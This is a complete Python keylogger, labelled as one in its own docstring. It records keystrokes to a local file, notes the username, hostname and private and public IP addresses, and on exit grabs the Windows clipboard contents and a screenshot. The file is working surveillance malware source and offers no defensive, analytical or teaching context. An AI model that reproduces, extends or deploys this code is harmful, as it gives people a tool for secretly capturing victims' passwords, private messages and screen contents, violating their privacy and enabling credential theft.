from pynput.keyboard import Key, Listener
import time
import os
import socket
import requests
import win32clipboard
from PIL import ImageGrab

user = os.path.expanduser('~').split('\\')[2]
hostname = socket.gethostname()
publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(hostname)
datetime = time.ctime()
header = f'User Profile: {user}\nHost Name: {hostname}\nPublic IP: {publicIP}\nPrivate IP: {privateIP}\nDate: {datetime}\n'

log_path = "log.txt"
clipboard_path = "clipboard.txt"
screenshot_path = "screenshot.png"

count = 0
keys = [header]

def copy_clipboard():
	with open(clipboard_path, "a") as fd:
		try:
			win32clipboard.OpenClipboard()
			clipboard_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			fd.write(clipboard_data + "\n")
			
		except:
			fd.write("Error copying clipboard\n")
			
def take_screenshot():
	image = ImageGrab.grab()
	image.save(screenshot_path)

def on_press(key):
	global count, keys
	keys.append(key)
	count += 1
	if count > 3:
		count = 0
		write_file(keys)
		keys = []
	
def write_file(keys):
	with open(log_path, "a") as fd:
		for key in keys:
			k = str(key).replace("'", "")
			if k == "Key.space":
				fd.write("\n")
			elif k.find("Key") == -1:
				fd.write(k)

def on_release(key):
	'''Terminate keylogger by pressing escape. Copies clipboard and takes a screenshot on exit.'''
	if key == Key.esc:
		with open(log_path, "a") as fd:
			fd.write("\n")
		copy_clipboard()
		take_screenshot()
		return False

if __name__ == '__main__':
	with Listener(on_press = on_press, on_release = on_release) as listener:
		listener.join()